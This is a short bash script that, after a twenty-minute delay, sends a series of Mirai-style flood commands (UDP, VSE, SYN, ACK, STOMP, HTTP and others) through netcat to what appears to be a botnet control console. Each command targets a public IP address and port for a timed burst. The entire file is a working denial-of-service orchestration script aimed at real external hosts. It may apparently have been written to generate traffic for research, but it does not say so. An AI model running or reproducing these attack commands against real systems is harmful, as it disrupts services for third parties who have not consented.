#!/bin/bash
TEMPO=10
USR="admin"
NC="nc 192.168.56.3 101"

sleep 20m

echo "$USR|udp 172.217.29.110 $TEMPO dport=443" |  $NC
sleep $((2*$TEMPO))s

echo "$USR|vse 52.94.209.132 $TEMPO dport=27015" |  $NC
sleep $((2*$TEMPO))s

echo "$USR|udpplain 130.149.17.8 $TEMPO dport=123" |  $NC
sleep $((2*$TEMPO))s

echo "$USR|syn 93.184.216.34 $TEMPO dport=80" |  $NC
sleep $((2*$TEMPO))s

echo "$USR|ack 35.174.82.237 $TEMPO dport=11095" |  $NC
sleep $((2*$TEMPO))s

echo "$USR|stomp 34.240.169.254 $TEMPO dport=443" |  $NC
sleep $((2*$TEMPO))s

echo "$USR|http 176.32.98.203 $TEMPO dport=80" |  $NC
sleep $((2*$TEMPO))s